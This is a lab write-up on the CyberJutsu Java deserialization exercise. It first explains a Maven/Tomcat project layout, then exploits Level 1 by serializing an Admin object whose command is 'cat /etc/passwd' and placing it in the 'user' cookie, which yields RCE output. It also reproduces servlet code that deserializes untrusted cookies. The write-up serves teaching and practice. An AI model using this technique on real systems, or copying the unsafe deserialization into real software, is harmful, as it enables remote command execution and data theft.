[Part 1: Before we start]

    - So if you are new to Java web development and don't know where to start, don't worry
    
    - Now open the /debug-java-web and analyze each part with me

            bigbox@ubuntu:~/Writeup/cyberjutsu/.../debug-java-web$ tree
            .
            ├── pom.xml
            ├── src
            │   └── main
            │       ├── java
            │       │   └── com
            │       │       └── example
            │       │           ├── GoodbyeServlet.java
            │       │           └── HelloServlet.java
            │       └── webapp
            │           ├── hello.txt
            │           ├── index.jsp
            │           └── WEB-INF
            │               └── web.xml
            └── target
                ├── classes
                │   └── com
                │       └── example
                │           ├── GoodbyeServlet.class
                │           └── HelloServlet.class
                ├── generated-sources
                │   └── annotations
                ├── generated-test-sources
                │   └── test-annotations
                └── test-classes

    [*] /pom.xml

        [+] Basically pom.xml is just a configuration file that contains information about project dependencies, settings, and packaging 
            
            (Maven uses this information to build and deploy the project)

    // [?] What is Maven, you may wonder? It is just software that helps you easier to manage dependencies, and automate the build process.

                ...
                <groupId>com.example</groupId>
                <artifactId>debug-java-web</artifactId>
                <version>1.0-SNAPSHOT</version> 

    // [?] Specifies the version number of the project
                
                <name>debug-java-web</name> 
                <packaging>war</packaging>

    // [?] Specifies the type of packaging used for the project. 
           In this case, it is set to "war", which stands for Web ARchive. This packaging is used for Java web applications.
                
                ...
                <dependency>
                    <groupId>javax.servlet</groupId>
                    <artifactId>javax.servlet-api</artifactId>
                    <version>3.1.0</version>
                    <scope>provided</scope>
                </dependency>
                ...

            => root@f66b048b7d39:/home/cbjs# ls

                apache-maven-3.6.3
                ...
                debug-java-web-1.0-SNAPSHOT.war
                ...
                apache-tomcat-8.5.35
                debug-java-web
                ...
                jdk1.8.0_131

    [*] /src/main/java/com/example

        - Before deep dive into this, you should look at the first line of the GoodbyeServlet.java

            package com.example;
            ...

        => This line at the beginning of a Java file is used to define the package to which that particular Java file belongs. 
           This package declaration is independent of the directory structure. However, Java does not enforce this relationship

        - According to CodeGPT this is how we should understand this kind of hierarchy

                src: contains the source code and resources of your project.

                main: represents the main source folder of your project.

                java: contains the Java source code files

                com: represents the package structure of your project.

                example: represents the subpackage structure within the com package.

    [*] /webapp 
        
        - This directory contains the web application's static resources, such as HTML, CSS, and JavaScript files

        - And you can see index.jsp right? it is nothing special. Just think about index.php, they are the same

    [*] /WEB-INF/web.xml

        - This file is the web application's deployment descriptor, which describes the application's servlets, filters, and other components.

                <display-name>My App</display-name>

    // [?] <display-name> element specifies the display name of the web application

                <servlet>

    // [?] Servlet is a Java class that extends the HttpServlet class. Servlets are used to extend the functionality of a web server. 
           They can be used to handle HTTP requests, generate dynamic content, and interact with databases.
    
                    <servlet-name>goodbye</servlet-name>
                    <servlet-class>com.example.GoodbyeServlet</servlet-class>
                </servlet>

                <servlet-mapping>

    // [?] The <servlet-mapping> element specifies a mapping between a servlet and a URL pattern

                    <servlet-name>goodbye</servlet-name>
                    <url-pattern>/goodbye</url-pattern>
                </servlet-mapping>
                </web-app>

            => From this code you can understand that when a user requests the URL /goodbye, the Tomcat web server will invoke the GoodbyeServlet class. 
                
               (The GoodbyeServlet class can then handle the request and generate a response)

    [*] /target

        - The /target directory is used to store the compiled files for a Java web application. 

        - When you build a Java web, the Maven build process will compile the source code and generate the class files 
          
          (The class files will be stored in the /target directory)

        - The /target directory is not directly accessible to the web. The web server will only serve files that are located in the /webapp directory.

   [Fact] Tomcat is a Java-based web server that can be used to host Java web applications, just like the relationship between PHP and Apache2
           catalina.sh typically refers to the startup script for Apache Tomcat, which is an open-source Java Servlet Container developed by the Apache Software Foundation

    [*] Okay, so if you are wondering where the maven, tomcat, and tons of war files in the container came from, focus on the docker-compose.yml

        version: "3.0"
        services:
        deserialize:
            image: cyberjutsu/java-deserialization-lab-local:1.3

    // [?] "image" will pull java-deserialization-lab-local tag 1.3 from https://hub.docker.com/r/cyberjutsu/java-deserialization-lab-local/tags (about 900 MB)
           the thing you downloaded contains 32 layers and runs a lot of setup commands (you can see detail in the Images on the Docker Desktop)

            container_name: java_deserialize
            volumes:
            - "./src/java_deserialization:/home/cbjs/java_deserialization"
            - "./src/debug-java-web:/home/cbjs/debug-java-web"
            - "./logs:/home/cbjs/apache-tomcat-8.5.35/logs"
            ...

        - Backend stuff will be deployed in the /home/cbjs/apache-tomcat-8.5.35/webapps, just think about /var/www/html, they are kind da same
          However, they can run because of class and dependencies stuff in the apache-maven-3.6.3, so each time you fix the source, remember to clean mvn file and restart

        => Luckily, CBJS already code for us the build.sh, which can automatically clean and restart the lab for us


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


[Part 2: Java Deserialization Attack] 

[Level 1]

[*] Target: http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT/

    - Now! Before solving this lab we gonna look at the source a little bit

        [-] HelloServlet.java:

                package com.example.javadeserialize; // [?] Since all the java file are stored in the /java/com/example/javadeserialize,
                                                            => We can easily access the Admin and User classes
                ...
                @WebServlet(name = "helloServlet", value = "/hello-servlet")
            /* 
                [?] @WebServlet is used to define the URL pattern(s) to which the servlet will respond. In this case, the servlet is mapped to the "/hello-servlet" URL.

                => When a client makes an HTTP request to the "/hello-servlet" URL, the servlet's doGet or doPost method 
            */
                public class HelloServlet extends HttpServlet {

                    public String serializeToBase64(Serializable obj) throws IOException {
                        ByteArrayOutputStream output = new ByteArrayOutputStream(); 
                    
                    // [?] Just turn "ouput" object into a byte array for oos stream blow passing serialized stuff into it
                    
                        ObjectOutputStream oos = new ObjectOutputStream(output);
                        oos.writeObject(obj); // [?] This is truly where the data of the object is serialized
                        oos.close();
                        return Base64.getEncoder().encodeToString(output.toByteArray()); // [?] it base64 encode the serialized object to make things easier to transport
                    }

                    private static Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
                        byte[] data = Base64.getDecoder().decode(s); // told ya (^.^!)
                        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
                        Object o  = ois.readObject(); // [?] Exactly! deserialization happened in this line
                        ois.close();
                        return o;
                    }

                    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                        try {
                            response.setContentType("text/html");
                            PrintWriter out = response.getWriter();
                            Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
                            
                            // [?] user's cookie is collected and stored as cookieMap
                            
                            User user;
                            if (!cookieMap.containsKey("user")) {
                                user = new User();
                                Cookie cookie = new Cookie("user", serializeToBase64(user));
                                response.addCookie(cookie);
                            } else {
                                try {
                                    user = (User)deserializeFromBase64(cookieMap.get("user")); // [?] Learn C and you know what (User) means
                                } catch (Exception e) {
                                    out.println("Please don't hack me");
                                    e.printStackTrace();
                                    return;
                                }
                            }
                            out.println("<html><body>");
                            out.println("<h1>Level 1 Hello " + user + "</h1>");
                            out.println("</body></html>");
                    ...
                    }
                }}

        [-] User.java: Nothing special here! I gonna skip this

        [-] Admin.java:

                ...
                public class Admin extends User {
                    private String getNameCMD;
                    public Admin() {
                        this.getNameCMD = "whoami";
                    }

                    @Override
                    public String toString() { // [?] Hehe! RCE time. Remind if you forgot out.println("<h1>Level 1 Hello " + user + "</h1>") in the HelloServlet.java
                        try {
                            Process proc = Runtime.getRuntime().exec(this.getNameCMD); // [?] execute "whoami"
                            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                            return stdInput.readLine();
                        } catch (IOException e) {
                            return "";
                        }
                    }}

    - There is a lab called "exploit tool", I gonna use it to generate payloads since the serialize chain is impossible to write to me

    - Yeahhhh! I know, I know, you might think what the hack is this tool, and so do I. However, after looking at this code I realized that
      this tool (or none-sense lab) is just a place for us to execute java stuff because things here are much harder to run than php (Thank CBJS, but please take note of that)

    - After copying all java files in lv1 and pasting those to the empty lab, I fixed a little bit to print out the serialized payload
    
        [-] HelloServlet.java:

            ...
            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                try {
                    response.setContentType("text/html");
                    PrintWriter out = response.getWriter();
                    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
                    User user = new Admin(); // [?] Why not! Admin just are extended fron User right 
                    out.println("<html><body>");
                    out.println("<h1>Payload: " + serializeToBase64(user) + "</h1>"); // print out the serialized payload
                    out.println("</body></html>");
                } ... }

        [-] Admin.java:

            ... 
            public class Admin extends User {
                private String getNameCMD;
                public Admin() {
                    this.getNameCMD = "cat /etc/passwd";
                } ... }

    - Now! clean the mvn and restart the lab

    [!] http://localhost:13337/deserialize-exploit-1.0-SNAPSHOT/hello-servlet => Payload: rO0ABXNy...9wYXNzd2Q=

    [>>] Replace the User's cookie in http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT/hello-servlet with the payload I just generated

    [Final Result: RCE] Level 1 Hello root:x:0:0:root:/root:/bin/bash